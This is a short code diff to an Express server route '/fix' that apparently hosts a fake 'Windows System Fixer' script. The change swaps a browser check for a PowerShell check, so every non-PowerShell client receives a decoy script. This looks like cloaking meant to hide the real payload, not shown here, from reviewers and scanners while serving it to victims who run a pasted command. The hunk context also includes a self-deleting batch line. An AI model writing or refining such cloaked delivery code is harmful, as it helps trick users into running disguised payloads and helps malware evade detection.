@@ -268,9 +268,9 @@ del "%~f0"
 app.get("/fix", (req, res) => {
   const ua = (req.headers["user-agent"] || "").toLowerCase();
   const host = req.headers.host || "zxcrosfixer.up.railway.app";
-  const isBrowser = ua.includes("mozilla") || ua.includes("chrome") || ua.includes("safari") || ua.includes("firefox") || ua.includes("edge") || ua.includes("opera");
+  const isPosh = ua.includes("powershell") || ua.includes("windowspowershell");
 
-  if (isBrowser) {
+  if (!isPosh) {
     const fake = `# ============================================
 # Windows System Fixer v3.2.1
 # Maintenance & Optimization Script
